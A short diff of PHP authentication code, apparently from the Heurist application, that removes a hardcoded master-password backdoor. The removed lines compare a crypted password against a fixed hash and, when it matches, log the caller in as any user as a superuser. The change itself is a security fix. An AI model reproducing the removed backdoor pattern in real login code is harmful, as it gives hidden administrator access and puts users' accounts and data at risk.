@@ -1556,18 +1556,8 @@ error_log('CANNOT UPDATE COOKIE '.$session_id);
 
         if($username && $password){
             
-            $superuser = false;
-            if(true
-            && (crypt($password, 'V96Sjze89.xnI') == 'V96Sjze89.xnI')
-            )
-            {
-                $user_id = is_numeric($username)?$username:2;
-                $user = user_getById($this->mysqli, $user_id);
-                $superuser = true;
-            }else{
-                //db_users
-                $user = user_getByField($this->mysqli, 'ugr_Name', $username);
-            }
+            //db_users
+            $user = user_getByField($this->mysqli, 'ugr_Name', $username);
 
             if($user){
 
@@ -1576,7 +1566,7 @@ error_log('CANNOT UPDATE COOKIE '.$session_id);
                     $this->addError(HEURIST_REQUEST_DENIED,  "Your user profile is not active. Please contact database owner");
                     return false;
 
-                }else if ( $superuser || crypt($password, $user['ugr_Password']) == $user['ugr_Password'] ) {
+                }else if ( crypt($password, $user['ugr_Password']) == $user['ugr_Password'] ) {
                     
                     $this->doLoginSession($user['ugr_ID'], $session_type);
 
